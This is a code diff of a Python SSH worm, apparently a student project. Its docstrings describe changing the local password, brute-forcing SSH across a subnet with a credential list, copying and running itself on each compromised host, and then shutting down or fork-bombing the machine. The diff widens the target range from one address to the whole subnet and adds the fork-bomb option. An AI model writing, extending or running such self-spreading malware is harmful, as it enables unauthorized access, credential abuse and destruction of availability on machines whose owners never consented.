@@ -1,12 +1,15 @@
 #!/usr/bin/env python
+
 """
-Program worm should first:
+Program worm will:
 1- change password of current machine
-2- create IP range list, 
+2- create IP range list,
 3- try to ssh to devices within the IP range using list of user credentials
 4- copy itself on ssh success
-5- run the python there
-6- shutdown current machine
+5- run the script there
+6- shutdown current machine or go into infinite fork
+
+@author Hassan Chadad
 """
 
 import paramiko
@@ -35,7 +38,7 @@ A function that creates IP addresses and adds them to the ip_range list in the r
 from 192.168.137.2 - 192.168.137.254
 """
 def generate_IP_list():
-    for i in range(143, 144): 
+    for i in range(2, 254): 
         ip = "192.168.137." + str(i)
         ip_range.append(ip)
 
@@ -148,6 +151,15 @@ def shutdown_device ():
     subprocess.call("sudo shutdown -h now", shell=True)
 
 
+"""
+Main function that checks first if arguments are sent in the execution command. if the first argument = 1, it means harm or attack 
+the current machine. If the password is passed as an argument, the script will change the user's account password as a kind of attack.
+Otherwise, it will mark the password changing as failed. After deciding of doing the attack or not, generate_IP_list function is called
+to generate an IP range and add it to a list. Then start_ssh_devices function is called to start SSH attacks on the IP range.
+Finally, the function checks again if the first argument = 1 then checks if the password change failed or not. If it failed then it will
+do another kind of attack which is calling infinite forks to create child processes. But if the the change password succeeded, the 
+shutdown_device function is called to shutdown current machine.
+"""
 if __name__ == "__main__":
 
     # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
